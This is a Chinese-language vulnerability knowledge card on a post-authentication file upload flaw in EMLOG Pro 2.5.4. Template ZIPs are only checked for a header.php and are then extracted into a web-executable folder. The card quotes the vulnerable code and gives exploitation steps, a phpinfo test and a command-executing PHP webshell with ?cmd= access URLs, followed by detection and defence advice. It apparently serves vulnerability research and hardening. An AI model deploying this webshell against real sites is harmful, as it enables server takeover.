---
id: web-generic-file-upload-emlog-template-zip-header-php-rce
title: EMLOG 后台模板 ZIP 上传只校验 header.php 存在，解压后 PHP 落 Web 目录执行
type: scenario
domain: web
path: web/generic/file-upload
technique: template-zip-install-header-php-execution
aliases:
- EMLOG 模板文件上传
- EMLOG Pro 2.5.4 文件上传
- emUnZip 模板解压
- header.php 校验绕过
- 模板 ZIP getshell
tags:
- php
- emlog
- cms
- file-upload
- zip
- template-install
- webshell
- post-auth
cve: []
severity: high
confidence: high
affected_versions: EMLOG Pro 2.5.4（原文测试版本）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V31
  verified_at: '2026-11-05T06:01:06+08:00'
  notes: 已对照原文与图01-09核对：图03后台为EmLog Pro 2.5.4；图04 admin/template.php 调用 emUnZip($zipfile['tmp_name'],'../content/templates/','tpl')；图05 common.php 以 explode('/',getNameIndex(0),2) 推断顶级目录并仅 getFromName($dir.'header.php') 做存在性校验（缺失返回-2）；图06 extractTo($path) 成功后 return 0；图07/08 ZIP 结构为 xxxxxx/header.php；图09 访问 /content/templates/<目录>/header.php 输出 phpinfo，代码执行成立。版本 Pro 2.5.4 为原文测试环境（版本号&&环境）且卡内已标注为测试版本，非影响区间声明；原文未利用 Zip Slip，卡内边界表述准确。PoC 未在本机复现。
---

## 一句话结论

EMLOG Pro 2.5.4 后台的模板上传功能在 `admin/template.php` 里调用 `emUnZip($zipfile['tmp_name'], '../content/templates/', 'tpl')`；`emUnZip` 只检查 ZIP 内首个条目所在顶级目录下存在 `header.php`，既不校验 `header.php` 的内容/后缀，也不限制 ZIP 内其他文件，解压后 PHP 代码直接落在 Web 可访问的 `content/templates/<目录>/header.php`，访问即执行。

## 原理

- 入口 `admin/template.php` 把上传 ZIP 的临时路径交给 `emUnZip`，目标目录硬编码为 `../content/templates/`，类型 `tpl`。
- `include/lib/common.php` 的 `emUnZip` 逻辑：
  ```php
  $r = explode('/', $zip->getNameIndex(0), 2);
  $dir = isset($r[0]) ? $r[0] . '/' : '';
  switch ($type) {
      case 'tpl':
          $re = $zip->getFromName($dir . 'header.php');
          if (false === $re) {
              return -2;
          }
          break;
  }
  if (true === @$zip->extractTo($path)) {
      $zip->close();
      return 0;
  }
  ```
  它用 ZIP 的第一个条目名推断“顶级目录”，然后只验证该目录下 `header.php` 可读；验证通过后直接 `extractTo($path)` 解压全部条目，没有扩展名白名单、内容检查或解压条目路径校验。
- 因此攻击者可以构造 ZIP：`任意顶级目录/header.php`，其中 `header.php` 是 PHP 代码；其余条目任意。`extractTo` 把 `header.php` 写到 `../content/templates/任意顶级目录/header.php`，而 `content/` 位于站点 Web 根下，该文件被 PHP 解析器执行。
- 校验只关心“有没有 header.php”，这正是绕过点：文件名必须是 `header.php`，但内容是攻击者完全可控的 PHP；顶级目录名也任意，便于避免与现有模板冲突。
- 该功能位于管理后台，正常利用需要有效的管理员会话；漏洞本质是“模板安装”信任了上传 ZIP 的内容并解压到可执行目录。

## 触发条件

- EMLOG Pro 2.5.4（原文测试版本）且管理后台可登录。
- 后台模板上传/安装功能可用，`content/templates/` 可写。
- Web 服务器对 `content/templates/` 下的 `.php` 按 PHP 解析（默认部署即如此）。
- ZIP 内有且仅需一个顶级目录，且该目录下存在 `header.php`。

## 利用步骤

1. 本地创建目录 `xxxxx/`，放入 `header.php`，内容为 PHP 代码（如 `<?php phpinfo(); ?>` 或命令马）。
2. 将 `xxxxx/` 整体压缩为 ZIP（保证 ZIP 第一个条目是 `xxxxx/` 或 `xxxxx/header.php`，使 `getNameIndex(0)` 推出的 `$dir` 为 `xxxxx/`）。
3. 登录 EMLOG 管理后台，进入模板上传/安装功能，上传该 ZIP。
4. `emUnZip` 校验 `xxxxx/header.php` 存在后解压，文件落到 `/content/templates/xxxxx/header.php`。
5. 访问 `http://target/content/templates/xxxxx/header.php`，PHP 被执行（原文截图为 phpinfo 页面）。

## PoC

ZIP 结构：

```text
xxxxx/
└── header.php
```

`header.php` 最小内容（原文用 phpinfo 验证）：

```php
<?php phpinfo(); ?>
```

命令执行变体：

```php
<?php system($_GET['cmd']); ?>
```

上传后访问：

```text
http://target/content/templates/xxxxx/header.php
http://target/content/templates/xxxxx/header.php?cmd=id
```

注意：顶级目录名必须与 ZIP 内实际目录一致；`header.php` 必须位于该顶级目录下，否则 `getFromName` 返回 false，`emUnZip` 返回 -2，上传失败。

## 变体与关联

- 目录名变体：顶级目录可任意命名，只要 ZIP 结构与之一致；可每次换名避免覆盖已存在模板。
- 内容变体：`header.php` 可放任意 PHP（phpinfo、命令马、加密马）；ZIP 内还可附带其他文件，`extractTo` 会一并解压。
- 关联：[[web-generic-file-upload-zip-slip-webshell-write]]（ZIP 解压路径穿越写 WebShell；本卡不依赖 `../` 条目，而是解压目录本身可执行）；[[web-generic-file-upload-weak-suffix-bypass]]（上传类型校验缺失的通用形态）。
- 边界：若后台模板功能被移除、`content/templates` 禁止 PHP 执行，或 `emUnZip` 增加扩展名/内容白名单，则失效。原文未利用 ZIP 条目路径穿越，`extractTo` 是否会受 Zip Slip 影响需另行验证。

## 检测与防御

- 检测：后台模板上传请求携带 ZIP，ZIP 内包含 `.php`/`header.php` 且内容含 `<?php`、`system`、`eval` 等；解压目录 `content/templates/` 新增 PHP 文件。
- 检测：访问 `/content/templates/*/*.php` 的请求，尤其是新目录下的 `header.php`；Web 日志中出现该路径的 200 响应。
- 防御：模板 ZIP 安装时校验每个条目的扩展名与路径，拒绝 `.php` 等可执行文件；只允许白名单内的模板文件类型（html/css/js/图片等）。
- 防御：将模板解压到 Web 根之外，或对 `content/templates/` 配置禁止脚本执行（Nginx/Apache 层）。
- 防御：校验 `header.php` 的内容/签名，而不只是存在性；限制后台模板上传权限并审计管理员操作。
- 加固：及时更新 EMLOG 版本；后台强口令与多因素；上传目录最小权限。
